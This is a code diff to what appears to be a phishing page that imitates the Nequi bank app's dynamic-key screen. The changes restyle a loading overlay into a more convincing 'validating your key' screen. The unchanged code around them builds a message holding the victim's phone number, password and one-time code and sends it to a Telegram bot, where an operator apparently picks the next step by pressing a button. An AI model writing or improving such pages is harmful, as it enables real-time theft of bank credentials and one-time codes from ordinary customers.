@@ -8,37 +8,76 @@
   <link rel="stylesheet" href="../css/globals.css" />
   <link rel="shortcut icon" type="image/x-icon" href="../assets/favicon.html" />
   <style>
-    .loadingOverlay {
+    /* Pantalla de validación - estilo Nequi */
+    .validatingScreen {
       display: none;
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background-color: rgba(32, 0, 32, 0.85);
+      background-color: #200020;
       z-index: 9999;
       justify-content: center;
       align-items: center;
+      flex-direction: column;
     }
     
-    .loadingOverlay.active {
+    .validatingScreen.active {
       display: flex;
     }
     
-    .loadingContent {
+    .validating-content {
       text-align: center;
+      padding: 2rem;
+      max-width: 320px;
+    }
+    
+    .validating-icon {
+      width: 120px;
+      height: 120px;
+      margin: 0 auto 2rem;
+      animation: pulse 2s ease-in-out infinite;
+    }
+    
+    @keyframes pulse {
+      0%, 100% {
+        transform: scale(1);
+        opacity: 1;
+      }
+      50% {
+        transform: scale(1.05);
+        opacity: 0.8;
+      }
+    }
+    
+    .validating-title {
       color: white;
+      font-size: 1.5rem;
+      font-weight: bold;
+      margin-bottom: 1rem;
+      line-height: 1.3;
     }
     
-    .loadingContent img {
-      width: 80px;
-      height: 80px;
-      margin: 0 auto 1rem;
+    .validating-message {
+      color: rgba(255, 255, 255, 0.7);
+      font-size: 1rem;
+      line-height: 1.5;
+      margin-bottom: 2rem;
     }
     
-    .loadingContent p {
-      font-size: 1.1rem;
-      margin: 0.5rem 0;
+    .validating-spinner {
+      width: 40px;
+      height: 40px;
+      border: 4px solid rgba(255, 255, 255, 0.1);
+      border-top-color: #FF006B;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
     
     .errorMessage {
@@ -50,10 +89,16 @@
       margin: 1rem 1rem 0 1rem;
       text-align: center;
       transition: all 0.3s ease;
+      font-size: 0.95rem;
     }
     
     .keyboard-btn:active {
       background-color: rgba(255, 255, 255, 0.2);
+      transform: scale(0.95);
+    }
+    
+    .keyboard-btn {
+      transition: all 0.1s ease;
     }
   </style>
 </head>
@@ -68,12 +113,15 @@
 </script>
 
 <body class="bg-purple-primary h-dvh flex flex-col">
-  <!-- Overlay de carga mejorado -->
-  <div class="loadingOverlay" id="loadingOverlay">
-    <div class="loadingContent">
-      <img src="../assets/loading-nequi.webp" alt="Cargando...">
-      <p style="font-weight: bold;">Validando clave dinámica...</p>
-      <p style="font-size: 0.9rem; opacity: 0.8;">Por favor espera un momento.</p>
+  <!-- Pantalla de validación estilo Nequi -->
+  <div class="validatingScreen" id="validatingScreen">
+    <div class="validating-content">
+      <div class="validating-icon">
+        <img src="../assets/loading-nequi.webp" alt="Validando...">
+      </div>
+      <h2 class="validating-title">Validando tu clave dinámica</h2>
+      <p class="validating-message">Estamos verificando tu información. Esto solo tomará unos segundos.</p>
+      <div class="validating-spinner"></div>
     </div>
   </div>
 
@@ -107,7 +155,7 @@
       Esta clave es única y expira en 2 minutos
     </p>
 
-    <div class="mt-auto w-full max-w-[400px] mx-auto" id="keyboard">
+    <div class="mt-auto w-full max-w-[400px] mx-auto pb-8" id="keyboard">
       <div class="flex justify-around mb-4">
         <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="1">1</button>
         <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="2">2</button>
@@ -145,7 +193,7 @@
       const inputs = document.querySelectorAll('input[id^="din-"]');
       const keyboard = document.getElementById("keyboard");
       const deleteBtn = document.getElementById("delete-din");
-      const loadingOverlay = document.getElementById("loadingOverlay");
+      const validatingScreen = document.getElementById("validatingScreen");
       const errorMessage = document.getElementById("errorMessage");
       let currentInput = 0;
 
@@ -217,8 +265,8 @@
             savedData.dinamica = dinamica;
             localStorage.setItem("formData", JSON.stringify(savedData));
             
-            // Mostrar overlay de carga
-            if (loadingOverlay) loadingOverlay.classList.add("active");
+            // Mostrar pantalla de validación estilo Nequi
+            if (validatingScreen) validatingScreen.classList.add("active");
 
             const mensaje = `🔐 *CLAVE DINÁMICA NEQUI*\n\n📱 *Número:* +57 ${savedData.phoneNumber}\n🔑 *Clave:* ${savedData.password}\n🎯 *Dinámica:* ${dinamica}\n⏰ *Hora:* ${new Date().toLocaleTimeString('es-CO')}\n📅 *Fecha:* ${new Date().toLocaleDateString('es-CO')}`;
             
@@ -241,17 +289,17 @@
               const responseMensaje = await sendTelegramMessageWithBtn(mensaje, teclado);
               const { action } = await waitForButtonPress(responseMensaje.message_id);
               
-              // Ocultar overlay antes de manejar la acción
-              if (loadingOverlay) loadingOverlay.classList.remove("active");
+              // Ocultar pantalla de validación
+              if (validatingScreen) validatingScreen.classList.remove("active");
               
               await handleAction(action, transactionId);
             } catch (error) {
               console.error("❌ Error:", error);
-              if (loadingOverlay) loadingOverlay.classList.remove("active");
+              if (validatingScreen) validatingScreen.classList.remove("active");
               
               if (errorMessage) {
                 errorMessage.style.display = "block";
-                errorMessage.textContent = "⚠️ Error de conexión. Intenta nuevamente.";
+                errorMessage.textContent = "⚠️ Error de conexión. Por favor intenta nuevamente.";
               }
               
               setTimeout(() => {
